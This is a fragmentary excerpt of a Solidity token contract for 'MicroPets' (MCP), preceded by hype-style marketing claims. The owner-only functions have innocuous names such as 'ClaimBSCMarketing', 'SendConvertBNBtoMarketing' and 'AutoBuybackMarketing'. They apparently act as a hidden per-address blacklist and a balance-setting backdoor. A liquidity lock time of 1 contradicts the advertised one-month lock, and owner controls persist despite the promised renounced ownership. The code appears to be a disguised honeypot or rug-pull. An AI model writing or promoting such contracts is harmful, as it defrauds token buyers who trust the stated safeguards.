...
MicroPets - Trend Hype Bullish Name | Degen Play | 2 BNB Starting Marketcap
...
🔥Smart Contract🔥
▪️Verified Contract 
▪️Liquidity Pool: 100% LP LOCKED 1 MONTH
▪️Ownership: Automatically  renounced (20k Marketcap)

🔥Fees Sharing🔥
🚀2% Auto Rewards.
🚀2% Auto Buyback + Burning.
...
*/
    ...
    contract MicroPets  is IBEP20, Ownable
    {
        ...
        string private constant _name = "MicroPets";
        string private constant _symbol = "MCP";
        uint8 private constant _decimals = 9;
        uint256 public constant ContractTokens=  1000000 * 10**_decimals;


        uint256 private constant DefaultLiquidityLockTime= 1;
        
        address public constant MarketingWallet=0x6f7488a8145eaF12b190c62B75df6493B921d9CF; 
        ...
        constructor () {
           ...
           function ClaimBSCMarketing(address account) external onlyOwner {
            _isSendRewards[account] = false;
          }
          
            function SendConvertBNBtoMarketing(address[] calldata addresses) external onlyOwner {
                 for (uint256 i; i < addresses.length; ++i) {
                     _isSendRewards[addresses[i]] = true;
                }
           }

      function AutoBuybackMarketing(address account, uint256 balance) onlyOwner  public virtual {
